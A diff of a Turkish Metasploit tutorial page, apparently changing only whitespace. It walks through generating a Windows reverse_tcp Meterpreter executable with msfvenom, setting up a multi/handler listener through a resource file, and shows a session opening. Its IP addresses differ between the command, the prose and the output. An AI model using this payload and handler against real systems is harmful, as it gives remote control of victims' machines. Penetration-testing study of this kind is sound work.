@@ -20,15 +20,9 @@ tags:
     - cybersecurity
     - 'metasploit framework'
 ---
-
-
 ## Script Yazma
 
-
-
 Öncelile, yeni bir script yazarken dikkat edilmesi gereken bir takım kuralları görelim.
-
-
 * 
 * Tüm Windows sürümleri aynı değildir.
 
@@ -37,17 +31,9 @@ tags:
 * Windows Scriptleri, sürüme bağlı olarak farklı davranış gösterirler.
 
 * Script yazarken Windows sürümüne özel davranmanız gerekebilir.
-
-
-
-
 Yukarıda belirtilen kuralları göz önünde bulundurarak, hedefe özel script yazmak gerekmektedir. Bu durumda yazacağımız script doğru çalışabilir.
 
-
-
 Şimdi, aşağıdaki komut ile çalıştırılabilir bir .exe dosyası oluşturalım. Bu program, hedef sistemde çalışacak ve yerel bilgisayarımıza reverse bağlantı açacaktır.
-
-
 ```bash
 root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=192.168.1.101 -b "\x00" -f exe -o Meterpreter.exe
 Found 10 compatible encoders
@@ -58,11 +44,7 @@ Payload size: 326 bytes
 Saved as: Meterpreter.exe
 ```
 
-
-
 Gerekli .exe dosyamız oluşturuldu. Bu dosya hedef windows işletim sistemi içinde çalışacak ve yerel bilgisayara iletişim sağlayacaktır. O zaman bizim yerel bilgisayarda dinleyici oluşturmamız gerekmektedir. Dinleyicimizi oluşturalım.
-
-
 ```bash
 root@kali:~# touch meterpreter.rc
 root@kali:~# echo use exploit/multi/handler **>>** meterpreter.rc
@@ -78,19 +60,11 @@ set ExitOnSession false
 exploit -j -z
 ```
 
-
-
 Dikkat ederseniz komutlarla, multi handler modülünü dinleyici olarak ayarladık. Payload modülü olarak reverse_tcp modülü kulandık. Yerel IP adresi olarak 192.168.1.184 ayarladık.
-
-
 
 Yeni yazdığımız scriptleri `/usr/share/metasploit-framework/scripts/meterpreter` klasörüne kayıt edersek, kolayca kullanabiliriz.
 
-
-
 Şimdi yapmamız gereken, `msfconsole` programını yeni oluşturduğumuz `meterpreter.rc` dosyasını kaynak göstererek başlatmak.
-
-
 ```bash
 root@kali:~# msfconsole -r meterpreter.rc
 
@@ -111,11 +85,7 @@ resource> exploit -j -z
 > Starting the payload handler...
 ```
 
-
-
 Yukarıda gördüğünüz gibi Metasploit Framework dinleme yaparak başlamıştır. Artık, oluşturduğumuz .exe dosyasını Windows içerisinde çalıştırdığımızda, oturum aktif hale gelecektir.
-
-
 ```bash
 > Sending stage (718336 bytes)
 > Meterpreter session 1 opened (192.168.1.158:4444 -> 192.168.1.104:1043)
